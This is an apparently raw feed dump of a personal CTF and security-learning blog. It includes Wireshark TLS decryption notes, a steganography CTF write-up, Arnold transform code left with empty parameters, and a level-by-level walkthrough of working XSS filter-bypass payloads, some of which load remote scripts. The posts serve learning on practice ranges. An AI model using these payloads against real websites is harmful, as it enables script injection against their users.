<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[-] Iteration: <span class="number">6</span>                                                                             </span><br><span class="line">[-] Heuristic Found Encoding To Be: Base32                                                   </span><br><span class="line">[-] Decoding <span class="keyword">as</span> Base32: This_is_So_S1mple                                                    </span><br><span class="line">&#123;&#123;&lt;&lt;======================================================================&gt;&gt;&#125;&#125;               </span><br><span class="line">[-] Total Iterations: <span class="number">6</span>                                                                      </span><br><span class="line">[-] Encoding Pattern: Base100 -&gt; Base92 -&gt; Base32 -&gt; Base64 -&gt; Base64 -&gt; Base32              </span><br><span class="line">[-] Magic Decode Finished With Result: This_is_So_S1mple                                     </span><br><span class="line">[-] Finished <span class="keyword">in</span> <span class="number">0.0019</span> seconds                         </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>basecrack</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-15-Gaps</title>
    <url>/2022/12/15/22-12-15-gaps/</url>
    <content><![CDATA[<p>The <code>gaps</code> is aim to complete the puzzle. </p>
<span id="more"></span><!--toc-->

<h1 id="INSTALL"><a href="#INSTALL" class="headerlink" title="INSTALL"></a>INSTALL</h1><ul>
<li>git clone <a href="https://github.com/nemanja-m/gaps.git">https://github.com/nemanja-m/gaps.git</a></li>
<li>cd gaps</li>
<li>pip3 install -r requirements.txt</li>
<li>python3 setup.py install</li>
</ul>
<h1 id="REQUIREMENT"><a href="#REQUIREMENT" class="headerlink" title="REQUIREMENT"></a>REQUIREMENT</h1><p>If <code>pip3 install -r requirements.txt</code> failed, make sure that your environments match the <code>requirements.txt</code>. </p>
<ul>
<li><code>pip3 install numpy</code></li>
<li><code>pip3 install opencv-python</code></li>
<li><code>pip3 install pytest</code></li>
<li><code>pip3 install matplotlib</code></li>
<li><code>pip3 install pillow</code></li>
</ul>
<h1 id="SETUP"><a href="#SETUP" class="headerlink" title="SETUP"></a>SETUP</h1><p>If run <code>python3 setup.py install</code> failed, maybe you have no permit. So run <code>sudo su</code> and <code>python3 setup.py install</code> again. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Using /usr/lib/python3/dist-packages</span><br><span class="line">Finished processing dependencies <span class="keyword">for</span> gaps==<span class="number">1.0</span></span><br></pre></td></tr></table></figure>

<p>Finally, the install is success. </p>
]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>gaps</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-20-Encrypto-Wireshark</title>
    <url>/2022/12/20/22-12-20-Encrypto-Wireshark/</url>
    <content><![CDATA[<p>Some traffic packets may be encrypted. When I import the private key in one case, I can’t get the decrypted packets like http.</p>
<p>FinalIy, I search for this problem and get the solution.</p>
<p>This post aims to make a conclusion about the <code>encrypted-traffic-packets(tls/ssl)</code>. </p>
<span id="more"></span><!--toc-->

<h1 id="REFERENCE"><a href="#REFERENCE" class="headerlink" title="REFERENCE"></a>REFERENCE</h1><blockquote>
<p><a href="https://www.cnblogs.com/jasy/p/16157388.html">https://www.cnblogs.com/jasy/p/16157388.html</a></p>
<p><a href="https://www.joji.me/zh-cn/blog/walkthrough-decrypt-ssl-tls-traffic-https-and-http2-in-wireshark/#md-sslkeylogfile">如何通过Wireshark查看HTTPS、HTTP&#x2F;2网络包（解码TLS、SSL） (joji.me)</a></p>
</blockquote>
<p>Really thank for the article!</p>
<p><em>The second is to edit the configuration of computer, which can be caught in the direct way by using webshell.</em></p>
<h1 id="DECRYPT-TLS-x2F-SSL"><a href="#DECRYPT-TLS-x2F-SSL" class="headerlink" title="DECRYPT TLS&#x2F;SSL"></a>DECRYPT TLS&#x2F;SSL</h1><p>There are three methods to decrypt the encrypted-ssl&#x2F;tls packets.</p>
<ul>
<li>Use the <code>server&#39;s cert</code> or the <code>private-key</code> to decrypt.</li>
<li>Use the <code>ssl-key-log-file</code> to decrypt. </li>
<li>Disable the config setting to decrypt packets which use the <code>Diffie-Hellman-Exchange</code>.</li>
</ul>
<h2 id="Server’s-cert-x2F-Private-key"><a href="#Server’s-cert-x2F-Private-key" class="headerlink" title="Server’s cert&#x2F;Private-key"></a>Server’s cert&#x2F;Private-key</h2><h3 id="preparation"><a href="#preparation" class="headerlink" title="preparation"></a>preparation</h3><ul>
<li>TLS&#x2F;SSL packets</li>
<li>cert or private-key</li>
<li>wireshark</li>
</ul>
<h3 id="notice"><a href="#notice" class="headerlink" title="notice"></a>notice</h3><p>The TLS&#x2F;SSL packets should not relate to the <code>Diffie-Hellman-Exchange</code> and just a common encrypted packets. </p>
<h4 id="CERT-x2F-PRIVATEKEY"><a href="#CERT-x2F-PRIVATEKEY" class="headerlink" title="CERT&#x2F;PRIVATEKEY"></a>CERT&#x2F;PRIVATEKEY</h4><p>The cert or private-key should not be encrypted. And usually, the private-key is the standard of <code>PKCS#8</code>.</p>
<p>If you have a binary DER, it cannot be used in wireshark, and we ought to make a convert. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">openssl pkcs8 -nocrypt -<span class="keyword">in</span> der.key -informat DER -out pem.key -outformat PEM</span><br></pre></td></tr></table></figure>

<ul>
<li><em>der.key: the name and root of DER</em></li>
<li><em>pem.key: the output file</em></li>
</ul>
<p>And, the private-key ought to be like this: </p>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/1.png" class="" title="Private-key">

<p>which shows that the beginning is <code>-----BEGIN RSA PRIVATE KEY-----</code>.</p>
<h4 id="DECRYPT-KEY"><a href="#DECRYPT-KEY" class="headerlink" title="DECRYPT KEY"></a>DECRYPT KEY</h4><blockquote>
<p><a href="https://www.openssl.org/docs/manmaster/man1/rsa.html#EXAMPLES">&#x2F;docs&#x2F;manmaster&#x2F;man1&#x2F;rsa.html (openssl.org)</a></p>
</blockquote>
<p>If the beginning is <code>-----BEGIN ENCRYPTED PRIVATE KEY-----</code>, we should decrypt the key in a proper way. </p>
<p>a common command is:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">openssl rsa -<span class="keyword">in</span> [source file] -out [outfile]</span><br><span class="line"><span class="comment"># ?Maybe.</span></span><br></pre></td></tr></table></figure>

<h3 id="step"><a href="#step" class="headerlink" title="step"></a>step</h3><ul>
<li>OPEN the wireshark and import the private-key or cert.</li>
</ul>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/2.png" class="" title="setting">

<ol>
<li><strong>RSA keys list.</strong> Import private key, add the <code>port</code>, <code>ip</code>, <code>protocol</code>, <code>root</code> and the chosen <code>password</code>. <strong>Mainly used.</strong> </li>
<li><strong>TLS debug file.</strong> Some debug file.</li>
<li><strong>Master-Secret log.</strong> Key log file.</li>
</ol>
<ul>
<li>If all things right, and we will see the <code>http traffic</code>.</li>
</ul>
<h2 id="Key-log-file"><a href="#Key-log-file" class="headerlink" title="Key log file"></a>Key log file</h2><p>Use the <code>key log file</code>. Usually, this file is in the traffic packets. The key log file is like this.</p>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/3.png" class="" title="key log file">

<h2 id="Relate-to-D-H"><a href="#Relate-to-D-H" class="headerlink" title="Relate to D-H"></a>Relate to D-H</h2><p>Sometimes, the encrypted traffic packets cannot be decrypted by using methods above. </p>
<h3 id="how-to-recognize"><a href="#how-to-recognize" class="headerlink" title="how to recognize"></a>how to recognize</h3><p>When we analyze the traffic packets, we use command like <code>ip.addr == xxx.xxx.xxx.xxx &amp;&amp; tls</code> to find the target packets. </p>
<p>If we see the <code>Client Hello</code>, we should make a notice that it maybe a <code>D-H encrypted traffic packet</code>. </p>
<p>For example: </p>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/4.png" class="" title="D-H encrypted">

<p>We can change the browser to catch the traffic again.</p>
<h3 id="set-the-firefox"><a href="#set-the-firefox" class="headerlink" title="set the firefox"></a>set the firefox</h3><p>The address is <code>about:config</code>, and search for the <code>dhe</code>. </p>
<p>We can change the target according to the traffic packets or make all things   <code>false</code>. </p>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/5.png" class="" title="change firefox setting">

<h3 id="recatch-the-traffic-and-analyze"><a href="#recatch-the-traffic-and-analyze" class="headerlink" title="recatch the traffic and analyze"></a>recatch the traffic and analyze</h3><img src="/2022/12/20/22-12-20-Encrypto-Wireshark/6.png" class="" title="remove dhe">

<p>After importing the private key, we can see the  decrypted<code>http traffic</code>. </p>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/7.png" class="" title="decrypted http traffic">

<h1 id="CONCLUSION"><a href="#CONCLUSION" class="headerlink" title="CONCLUSION"></a>CONCLUSION</h1><p>The <code>Diffie-Hellman-Exchange</code> is really beyond my imagination. </p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>wireshark</tag>
        <tag>diffie_hellman</tag>
      </tags>
  </entry>
  <entry>
    <title>23-02-14-Abstract</title>
    <url>/2023/02/14/23-02-14-Abstract/</url>
    <content><![CDATA[<p>I am reading <em>Ideal, varieties, and algorithms</em>, however I haven’t learnt the abstract algebra. Thus I will make some records for some typical definitions, which can help me learn well about this book. </p>
<span id="more"></span><!--toc-->

<h1 id="Fields-and-Rings"><a href="#Fields-and-Rings" class="headerlink" title="Fields and Rings"></a>Fields and Rings</h1><p><strong>Def1</strong> a set $k$ and two binary operations $\cdot$ and $+$ defined on $k$.</p>
<h2 id="Conditions"><a href="#Conditions" class="headerlink" title="Conditions"></a>Conditions</h2><ul>
<li>$(a + b) + c &#x3D; a + (b + c)$ and $(a \cdot b) \cdot c &#x3D; a \cdot(b \cdot c)$ for all $a, b, c$</li>
</ul>
]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>abstract</tag>
        <tag>basic</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-21-UNknown</title>
    <url>/2022/12/21/22-12-21-UNknown/</url>
    <content><![CDATA[<p>Figure out 2 tasks. </p>
<p>One is for crypto, and the other is for misc. </p>
<p>Both of them are easy. </p>
<span id="more"></span><!--toc-->

<h1 id="poem"><a href="#poem" class="headerlink" title="poem"></a>poem</h1><blockquote>
<p>reference: [ACTF新生赛2020]base64隐写</p>
</blockquote>
<ul>
<li>base64stego</li>
<li>caeser cipher</li>
</ul>
<h2 id="base64stego"><a href="#base64stego" class="headerlink" title="base64stego"></a>base64stego</h2><p><a href="22-12-21-UNknown/poem.txt">poem.txt</a></p>
<p><em>Make sure that the end of each line. This ending is <code>\r\n</code></em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">base64stego</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;poem.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># print(f.readlines())</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64 = <span class="built_in">str</span>(line, <span class="string">&#x27;utf-8&#x27;</span>).strip(<span class="string">&#x27;\r\n&#x27;</span>) <span class="comment"># edit</span></span><br><span class="line">        <span class="comment"># print(stegb64)</span></span><br><span class="line">        row64 = <span class="built_in">str</span>(base64.b64encode(base64.b64decode(stegb64)), <span class="string">&#x27;utf-8&#x27;</span>).strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        offset = <span class="built_in">abs</span>(b64chars.index(stegb64.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]) - b64chars.index(row64.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += <span class="built_in">bin</span>(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">    output = [<span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>)]</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join(output)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="caeser-cipher"><a href="#caeser-cipher" class="headerlink" title="caeser cipher"></a>caeser cipher</h2><p><em>Just crack!</em></p>
<p>key is <code>13</code>.</p>
<h1 id="Alex2Bob"><a href="#Alex2Bob" class="headerlink" title="Alex2Bob"></a>Alex2Bob</h1><p><a href="22-12-21-UNknown/Alex2Bob.zip">Alex2Bob</a></p>
<ul>
<li>ARCHPR-mask</li>
<li>PNG-header</li>
<li>PNG-crack width</li>
<li>LSB</li>
</ul>
<h2 id="ARCHPR-mask"><a href="#ARCHPR-mask" class="headerlink" title="ARCHPR-mask"></a>ARCHPR-mask</h2><p>Known the end of the key is <code>kitty</code>.</p>
<p>This is the <code>mask attack</code>. We don’t know the length of the key, so we try some possibilities. </p>
<p>Until we try to set unknown length is 4, we get the key. </p>
<img src="/2022/12/21/22-12-21-UNknown/1.png" class="" title="setting&amp;output">

<h2 id="PNG-header"><a href="#PNG-header" class="headerlink" title="PNG-header"></a>PNG-header</h2><p>Use the <code>winhex</code> and analyze the png. We find that the file header is wrong, so we should edit the file header <code>88 -&gt; 89</code>. </p>
<img src="/2022/12/21/22-12-21-UNknown/2.png" class="" title="PNG-header">

<p>Still can’t open the picture or see the content. </p>
<h2 id="PNG-crack-width"><a href="#PNG-crack-width" class="headerlink" title="PNG-crack width"></a>PNG-crack width</h2><p>Crack the true width, and we will get the width is <code>0x260</code>. </p>
<img src="/2022/12/21/22-12-21-UNknown/3.png" class="" title="real width">

<p>Edit the width by winhex or 010Editor, and we will get the real picture. </p>
<img src="/2022/12/21/22-12-21-UNknown/newcat.png" class="" title="newcat">

<h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>Two ways to get the information embedded in LSB. </p>
<ul>
<li>stegsolve-original</li>
<li>zsteg</li>
</ul>
<img src="/2022/12/21/22-12-21-UNknown/4.png" class="" title="stegsolve-original">

<img src="/2022/12/21/22-12-21-UNknown/5.png" class="" title="zsteg">

<p>The cipher is <code>ZmxhZ3tsb3ZlX3JhZ2RvbGxfY2F0fQ==</code>, and base64 decode. </p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>base64steg</tag>
        <tag>mask_attack</tag>
        <tag>lsb</tag>
      </tags>
  </entry>
  <entry>
    <title>Arnold Transform</title>
    <url>/2023/07/04/Arnold-Transform/</url>
    <content><![CDATA[<p>AKA <code>cat map</code>.</p>
<p>The classic <code>Arnold Transform</code> is a two-dimensional reversible map. The discrete form of the <code>Arnold Transform</code> is periodic and changes with the size of the image.</p>
<span id="more"></span><!--toc-->

<h1 id="Special-Arnold-Transform"><a href="#Special-Arnold-Transform" class="headerlink" title="Special Arnold Transform"></a>Special Arnold Transform</h1><h2 id="Def-1"><a href="#Def-1" class="headerlink" title="Def.1"></a>Def.1</h2><p>$$<br>\begin{bmatrix}<br>    x’\\<br>    y’<br>\end{bmatrix}<br>&#x3D;<br>A<br>\begin{bmatrix}<br>    x\\<br>    y<br>\end{bmatrix}<br>\mod N, A &#x3D;<br>\begin{bmatrix}<br>    1 &amp; 1 \\<br>    1 &amp; 2<br>\end{bmatrix}<br>, 0\le x, y \le 1, 0\le x’, y’ \le 1<br>$$</p>
<p>$$<br>\Longrightarrow<br>\left\{<br>\begin{array}{lr}<br>    x’ &#x3D; (x + y) \mod N \\<br>    y’ &#x3D; (x + 2y) \mod N<br>\end{array}<br>\right.<br>$$<br>Two-dimensional Arnold Transform.</p>
<h2 id="Def-2"><a href="#Def-2" class="headerlink" title="Def.2"></a>Def.2</h2><p>$$<br>\begin{bmatrix}<br>    x\\<br>    y<br>\end{bmatrix}<br>&#x3D;<br>A^{-1}<br>\begin{bmatrix}<br>    x’\\<br>    y’<br>\end{bmatrix}<br>\mod N, A^{-1} &#x3D;<br>\begin{bmatrix}<br>    2 &amp; -1 \\<br>    -1 &amp; 1<br>\end{bmatrix}<br>, 0\le x, y \le 1, 0\le x’, y’ \le 1<br>$$</p>
<p>$$<br>\Longrightarrow<br>\left\{<br>\begin{array}{lr}<br>    x &#x3D; (2x’ - y’) \mod N \\<br>    y &#x3D; (-x’ + y’) \mod N<br>\end{array}<br>\right.<br>$$</p>
<p>Two-dimensional Arnold inverse transformation. </p>
<h1 id="General-Arnold-Transform"><a href="#General-Arnold-Transform" class="headerlink" title="General Arnold Transform"></a>General Arnold Transform</h1><h2 id="Def-1-1"><a href="#Def-1-1" class="headerlink" title="Def.1"></a>Def.1</h2><p>$$<br>\begin{bmatrix}<br>    x’\\<br>    y’<br>\end{bmatrix}<br>&#x3D;<br>\begin{bmatrix}<br>    1 &amp; a \\<br>    b &amp; ab + 1<br>\end{bmatrix}<br>\begin{bmatrix}<br>    x\\<br>    y<br>\end{bmatrix}<br>\mod N<br>$$</p>
<p>$$<br>\Longrightarrow<br>\left\{<br>\begin{array}{lr}<br>    x’ &#x3D; (x + ay) \mod N \\<br>    y’ &#x3D; (bx + (ab + 1)y) \mod N<br>\end{array}<br>\right.<br>$$</p>
<h2 id="Def-2-1"><a href="#Def-2-1" class="headerlink" title="Def.2"></a>Def.2</h2><p>$$<br>\begin{bmatrix}<br>    x\\<br>    y<br>\end{bmatrix}<br>&#x3D;<br>\begin{bmatrix}<br>    ab + 1 &amp; -a \\<br>    -b &amp; 1<br>\end{bmatrix}<br>\begin{bmatrix}<br>    x’\\<br>    y’<br>\end{bmatrix}<br>\mod N<br>$$</p>
<p>$$<br>\Longrightarrow<br>\left\{<br>\begin{array}{lr}<br>    x &#x3D; ((ab + 1)x’ - ay’) \mod N \\<br>    y &#x3D; (-bx’ + y’) \mod N<br>\end{array}<br>\right.<br>$$</p>
<h1 id="Accomplish"><a href="#Accomplish" class="headerlink" title="Accomplish"></a>Accomplish</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arnold</span>(<span class="params">image, arnold_times</span>):</span><br><span class="line">    a = </span><br><span class="line">    b = </span><br><span class="line">    <span class="comment"># Create a new image, a three-dimensional array of all 0s</span></span><br><span class="line">    decode_image = np.zeros(shape=image.shape)</span><br><span class="line">    <span class="comment"># Read the length and width pixels of the picture</span></span><br><span class="line">    height, width = image.shape[<span class="number">0</span>], image.shape[<span class="number">1</span>]</span><br><span class="line">    N = height  <span class="comment"># if it is a square, height is equal to width</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> time <span class="keyword">in</span> <span class="built_in">range</span>(arnold_times):  <span class="comment"># transformation times</span></span><br><span class="line">        <span class="comment"># Traverse the pixel coordinates of the image</span></span><br><span class="line">        <span class="keyword">for</span> old_x <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            <span class="keyword">for</span> old_y <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">                <span class="comment"># Arnold Inverse Transform</span></span><br><span class="line">                new_x = ((a * b + <span class="number">1</span>) * old_x + (-a) * old_y) % N <span class="comment"># N = height</span></span><br><span class="line">                new_y = ((-b) * old_x + old_y) % N <span class="comment"># N = width</span></span><br><span class="line">                <span class="comment"># Arnold Transform</span></span><br><span class="line">                <span class="comment"># new_x = (old_x + a * old_y) % N # N = height</span></span><br><span class="line">                <span class="comment"># new_y = (b * old_x + (a * b + 1) * old_y) % N # N = width</span></span><br><span class="line"></span><br><span class="line">                decode_image[new_x, new_y, :] = image[old_x, old_y, :]</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;xxx&#x27;</span>, decode_image, [<span class="built_in">int</span>(cv2.IMWRITE_PNG_COMPRESSION), <span class="number">0</span>])  <span class="comment"># write as PNG</span></span><br><span class="line">    <span class="keyword">return</span> decode_image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># imread(path,flag) reads the picture, the default parameter value of loading a color picture is flag=1, the grayscale is 0, the transparency is -1, the result is a three-dimensional array, the first two dimensions are pixel coordinates, and the last one is the channel index</span></span><br><span class="line">    it = cv2.imread(<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line">    arnold(it, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>cat</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-30-XSS</title>
    <url>/2022/12/30/22-12-30-XSS/</url>
    <content><![CDATA[<blockquote>
<p><a href="https://xss.haozi.me/#/0x00">alert(1) (haozi.me)</a></p>
</blockquote>
<p>Make a record. </p>
<span id="more"></span><!--toc-->

<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p><strong>No filtration.</strong> Just insert code normally. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x00.png" class="" title="0x00">



<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><ul>
<li><strong>End the label.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;textarea&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x01-1.png" class="" title="0x01-1">



<ul>
<li>End the label. <strong>IMG label error.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;img src=&quot;&quot; onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x01-2.png" class="" title="0x01-2">



<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p><strong>End the html code.</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x02.png" class="" title="0x02">



<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><p>Filtrate the <code>[()]</code>.  <strong>&#96; to bypass.</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert`1`&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x03.png" class="" title="0x03">



<h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p><strong>html code bypass.</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=alert&amp;#x28;&amp;#x31;&amp;#x29;&gt;</span><br></pre></td></tr></table></figure>

<p>Use burpsuite to encode the html. </p>
<img src="/2022/12/30/22-12-30-XSS/0x04-0.png" class="" title="0x04-0">

<img src="/2022/12/30/22-12-30-XSS/0x04-1.png" class="" title="0x04-1">



<h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h1><p><strong>Comment bypass.</strong> </p>
<p>There are two ways to comment for html. </p>
<ul>
<li><code>&lt;!-- comment --&gt;</code></li>
<li><code>&lt;!-- comment --!&gt;</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">comment1 --!&gt; &lt;script&gt;alert(1)&lt;/script&gt; &lt;!-- comment2</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x05.png" class="" title="0x05">



<h1 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h1><p>Regex matching, <strong>line break bypass</strong>.</p>
<img src="/2022/12/30/22-12-30-XSS/0x06-0.png" class="" title="0x06-0">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type = &quot;image&quot; src=&quot;&quot; onerror</span><br><span class="line">=alert(1)</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x06-1.png" class="" title="0x06-1">



<h1 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h1><p><strong>HTML single-tag parsing.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=alert(1) </span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x07-0.png" class="" title="0x07-0">

<img src="/2022/12/30/22-12-30-XSS/0x07.png" class="" title="0x07">



<h1 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h1><ul>
<li><strong>Regex escape</strong>, the label to be closed add a space to escape.</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x08-1.png" class="" title="0x08-1">

<ul>
<li><strong>Regex can’t match the space.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/style</span><br><span class="line">&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;style&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x08-0.png" class="" title="0x08-0">

<img src="/2022/12/30/22-12-30-XSS/0x08-2.png" class="" title="0x08-2">



<h1 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h1><p>Include the website. </p>
<ul>
<li><strong>“” ending bypass with IMG label.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com &quot;&gt;&lt;/script&gt;&lt;img src=&quot;&quot; onerror=&quot;alert(1)</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x09-1.png" class="" title="0x09-1">

<ul>
<li><strong>add a character and “” ending bypass.</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com1&quot; onerror=alert(1) </span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x09-2.png" class="" title="0x09-2">



<h1 id="0x0a"><a href="#0x0a" class="headerlink" title="0x0a"></a>0x0a</h1><blockquote>
<p>Failed! Don’t know why. </p>
</blockquote>
<ul>
<li><strong>Import the target file to complete the XSS.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com.haozi.me/j.js</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x0a.png" class="" title="0x0a">

<ul>
<li>the end of url add @target url</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com@https://www.xxx.com/j.js</span><br></pre></td></tr></table></figure>

<p><em>Make sure that the target url is <code>https</code>.</em></p>
<h1 id="0x0b"><a href="#0x0b" class="headerlink" title="0x0b"></a>0x0b</h1><p>IMG label and html encode. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x0b.png" class="" title="0x0b">



<h1 id="0x0c"><a href="#0x0c" class="headerlink" title="0x0c"></a>0x0c</h1><ul>
<li><p>Same above. </p>
</li>
<li><p>The anterior and posterior deformities are constructed.</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sscriptcript src=https://www.segmentfault.com.haozi.me/j.js&gt;&lt;/sscriptcript&gt;</span><br></pre></td></tr></table></figure>



<h1 id="0x0d"><a href="#0x0d" class="headerlink" title="0x0d"></a>0x0d</h1><p><strong><code>Enter</code> break the comment structure.</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">alert(1) </span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x0d.png" class="" title="0x0d">



<h1 id="0x0e"><a href="#0x0e" class="headerlink" title="0x0e"></a>0x0e</h1><p>Think reverse, find the character <strong>ſ</strong> which means <code>s</code>. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;ſcript src=&quot;https://www.segmentfault.com.haozi.me/j.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h1 id="0x0f"><a href="#0x0f" class="headerlink" title="0x0f"></a>0x0f</h1><p>HTML encode. End the code and comment at last. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;); alert(1) //</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x0f.png" class="" title="0x0f">



